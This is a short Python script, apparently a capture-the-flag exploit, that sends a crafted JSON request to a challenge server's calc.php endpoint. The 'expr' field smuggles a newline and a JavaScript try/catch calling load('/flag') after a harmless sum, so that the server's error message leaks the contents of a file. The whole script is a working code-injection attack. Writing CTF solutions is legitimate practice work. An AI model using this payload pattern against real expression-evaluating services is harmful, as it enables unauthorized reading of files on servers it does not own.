#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license
import requests
url="http://d3658cb50811494ba740f25d88f08b180b1ed12a58954ec1.changame.ichunqiu.com/calc.php"

cmd = """
try{
load("/flag");
}catch(error){
error
}
"""
data={
    "target":"/",
    "expr":"123+1234\n"+cmd
}
r = requests.post(url,json=data)
print r.text
#with open("final.py","w+") as f:
#    f.write(r.text)
